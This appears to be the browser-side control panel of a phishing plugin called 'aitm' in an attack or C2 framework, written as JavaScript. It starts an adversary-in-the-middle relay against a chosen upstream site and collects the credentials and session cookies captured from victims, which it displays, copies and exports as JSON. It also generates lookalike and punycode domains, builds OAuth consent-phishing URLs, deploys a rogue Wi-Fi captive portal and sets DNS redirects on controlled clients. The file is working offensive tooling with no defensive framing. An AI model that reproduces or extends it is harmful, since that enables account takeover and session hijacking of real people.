const PLUGIN_ID = "aitm";

let currentClientId = "";

const $ = (id) => document.getElementById(id);

async function rpc(method, params = {}) {
  const res = await fetch(`/api/plugins/${PLUGIN_ID}/rpc`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ method, params }),
  });
  const body = await res.json().catch(() => ({}));
  if (!body.ok) throw new Error(body.error || `rpc ${method} failed: ${res.status}`);
  return body.result;
}

async function sendEvent(event, payload = {}) {
  if (!currentClientId) {
    log("no client id set", "err");
    return;
  }
  await fetch(`/api/clients/${currentClientId}/plugins/${PLUGIN_ID}/event`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event, payload }),
  });
}

function setBadge(state) {
  const b = $("statusBadge");
  b.className = "badge " + (state || "idle");
  b.textContent = state || "idle";
}

function log(text, kind = "") {
  const el = $("log");
  const line = document.createElement("div");
  line.className = "line" + (kind ? " " + kind : "");
  const ts = document.createElement("span");
  ts.className = "ts";
  ts.textContent = new Date().toLocaleTimeString();
  line.appendChild(ts);
  line.appendChild(document.createTextNode(text));
  el.appendChild(line);
  while (el.children.length > 200) el.removeChild(el.firstChild);
  el.scrollTop = el.scrollHeight;
}

function collectSettings() {
  return {
    upstream: $("upstream").value.trim(),
    phishDomain: $("phishDomain").value.trim(),
    listenPort: parseInt($("listenPort").value, 10) || 8443,
    harvestCreds: $("harvestCreds").checked,
    harvestCookies: $("harvestCookies").checked,
    targetDomain: $("targetDomain").value.trim(),
    oauthClientId: $("oauthClientId").value.trim(),
    oauthTenant: $("oauthTenant").value.trim(),
    oauthScopes: $("oauthScopes").value.trim(),
    portalSsid: $("portalSsid").value.trim(),
  };
}

function renderCreds(list) {
  $("credCount").textContent = list.length;
  const body = $("credBody");
  body.innerHTML = "";
  if (!list.length) {
    $("credEmpty").style.display = "block";
    return;
  }
  $("credEmpty").style.display = "none";
  list.forEach((c) => {
    const tr = document.createElement("tr");

    const host = document.createElement("td");
    host.textContent = c.host || "-";

    const ip = document.createElement("td");
    ip.textContent = c.clientIp || "-";

    const f = document.createElement("td");
    f.className = "fields";
    const parts = Object.entries(c.fields || {}).map(([k, v]) => `${k}=${v}`);
    f.textContent = parts.join("  ") || "-";
    f.title = parts.join("\n");

    tr.appendChild(host);
    tr.appendChild(ip);
    tr.appendChild(f);
    body.appendChild(tr);
  });
}

function renderCookies(list) {
  $("ckCount").textContent = list.length;
  const body = $("ckBody");
  body.innerHTML = "";
  if (!list.length) {
    $("ckEmpty").style.display = "block";
    return;
  }
  $("ckEmpty").style.display = "none";
  list.forEach((c) => {
    const tr = document.createElement("tr");

    const dom = document.createElement("td");
    dom.textContent = c.domain || c.host || "-";

    const name = document.createElement("td");
    name.textContent = c.name;

    const val = document.createElement("td");
    val.className = "value";
    val.textContent = c.value;
    val.title = "click to copy";
    val.onclick = () => navigator.clipboard.writeText(c.value).then(() => log("cookie copied", "ok"));

    tr.appendChild(dom);
    tr.appendChild(name);
    tr.appendChild(val);
    body.appendChild(tr);
  });
}

function renderLookalikes(list) {
  $("lkCount").textContent = list.length;
  const el = $("lkList");
  el.innerHTML = "";
  if (!list.length) {
    el.className = "feed empty";
    el.textContent = "none generated";
    return;
  }
  el.className = "feed";
  list.forEach((l) => {
    const d = document.createElement("div");
    d.className = "row-item";
    d.innerHTML = `<span class="kind">${l.kind}</span> <span class="hl"></span>`;
    d.querySelector(".hl").textContent = l.domain;
    if (l.puny) d.title = `punycode: ${l.puny}`;
    d.style.cursor = "pointer";
    d.onclick = () => navigator.clipboard.writeText(l.domain).then(() => log("copied " + l.domain, "ok"));
    el.appendChild(d);
  });
}

function handleStream(data) {
  if (!data) return;
  const evt = data.event;
  const p = data.payload ?? data;
  if (p && p.clientId && p.clientId !== currentClientId) return;

  switch (evt) {
    case "status":
      setBadge(p.state);
      if (p.detail) log(p.detail);
      break;
    case "creds": {
      loadCreds();
      const parts = Object.entries(p.fields || {}).map(([k, v]) => `${k}=${v}`);
      log(`CREDS from ${p.clientIp || "?"}: ${parts.join(" ")}`, "ok");
      break;
    }
    case "cookie":
      loadCookies();
      log(`cookie ${p.name} from ${p.host}`, "ok");
      break;
    case "portal_submit": {
      loadCreds();
      const parts = Object.entries(p.fields || {}).map(([k, v]) => `${k}=${v}`);
      log(`PORTAL from ${p.clientIp || "?"}: ${parts.join(" ")}`, "ok");
      break;
    }
    case "lookalikes":
      log(`${p.count} lookalike candidate(s) for ${p.target}`, "ok");
      loadLookalikes();
      break;
    case "oauth_url":
      log("consent URL built", "ok");
      navigator.clipboard.writeText(p.url || "").catch(() => {});
      break;
    case "templates":
      (p.templates || []).forEach((t) => log(`${t.id}: ${t.name} — ${t.detail}`));
      break;
    case "proxy":
      log(`relay listening on :${p.port} -> ${p.upstream}`, "ok");
      break;
    case "dns_redirect":
      log(`${p.domain} -> ${p.ip} via ${p.method}`, "ok");
      break;
    case "error":
      log(p.message || "error", "err");
      break;
    default:
      break;
  }
}

function connectStream() {
  const es = new EventSource(`/api/plugins/${PLUGIN_ID}/stream`);
  ["status", "creds", "cookie", "portal_submit", "lookalikes", "oauth_url",
   "templates", "proxy", "dns_redirect", "error", "pong"].forEach((ch) => {
    es.addEventListener(ch, (ev) => {
      let data;
      try { data = JSON.parse(ev.data); } catch { data = null; }
      if (data != null) handleStream({ event: ch, payload: data });
    });
  });
  es.onerror = () => {
    es.close();
    setTimeout(connectStream, 3000);
  };
}

async function loadCreds() {
  if (!currentClientId) return;
  try { renderCreds(await rpc("list_creds", { clientId: currentClientId })); } catch (e) {}
}

async function loadCookies() {
  if (!currentClientId) return;
  try { renderCookies(await rpc("list_cookies", { clientId: currentClientId })); } catch (e) {}
}

async function loadLookalikes() {
  if (!currentClientId) return;
  try { renderLookalikes(await rpc("list_lookalikes", { clientId: currentClientId })); } catch (e) {}
}

async function loadConfig() {
  if (!currentClientId) return;
  try {
    const cfg = await rpc("get_config", { clientId: currentClientId });
    for (const [k, id] of [["upstream", "upstream"], ["phishDomain", "phishDomain"],
                           ["targetDomain", "targetDomain"], ["oauthClientId", "oauthClientId"],
                           ["oauthTenant", "oauthTenant"], ["oauthScopes", "oauthScopes"],
                           ["portalSsid", "portalSsid"]]) {
      if (cfg[k]) $(id).value = cfg[k];
    }
    if (cfg.listenPort) $("listenPort").value = cfg.listenPort;
  } catch (e) {}
}

async function refreshClients() {
  try {
    const clients = await rpc("list_clients");
    const dl = $("clientsList");
    dl.innerHTML = "";
    clients.forEach((c) => {
      const o = document.createElement("option");
      o.value = c.clientId;
      dl.appendChild(o);
    });
    $("clientCount").textContent =
      clients.length ? `${clients.length} client(s) seen` : "no clients seen yet";
    if (clients.length && !currentClientId) {
      currentClientId = clients[0].clientId;
      $("clientId").value = currentClientId;
      loadConfig(); loadCreds(); loadCookies(); loadLookalikes();
    }
  } catch (e) {}
}

async function save() {
  try { await rpc("save_config", { clientId: currentClientId, config: collectSettings() }); } catch (e) {}
}

function bind() {
  $("clientId").addEventListener("change", (e) => {
    currentClientId = e.target.value.trim();
    loadConfig(); loadCreds(); loadCookies(); loadLookalikes();
  });

  $("refreshClients").addEventListener("click", refreshClients);

  $("startProxy").addEventListener("click", async () => {
    await save();
    sendEvent("start_proxy", collectSettings());
  });

  $("stopProxy").addEventListener("click", () => {
    sendEvent("stop_proxy");
    setBadge("idle");
  });

  $("setupDns").addEventListener("click", async () => {
    await save();
    sendEvent("setup_dns", collectSettings());
  });

  $("genLook").addEventListener("click", async () => {
    await save();
    sendEvent("lookalikes", collectSettings());
  });

  $("buildOauth").addEventListener("click", async () => {
    await save();
    sendEvent("oauth", collectSettings());
  });

  $("deployPortal").addEventListener("click", async () => {
    await save();
    const s = collectSettings();
    s.listenPort = parseInt($("portalPort").value, 10) || 80;
    sendEvent("portal", s);
  });

  $("exportCk").addEventListener("click", async () => {
    try {
      const res = await rpc("export_cookies", { clientId: currentClientId });
      downloadJSON(res.cookies, "cookies.json");
      log(`exported ${res.count} cookie(s)`, "ok");
    } catch (e) {
      log("export failed: " + e.message, "err");
    }
  });
}

function downloadJSON(data, name) {
  const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = name;
  a.click();
  URL.revokeObjectURL(url);
}

bind();
connectStream();
loadConfig(); loadCreds(); loadCookies(); loadLookalikes();
refreshClients();
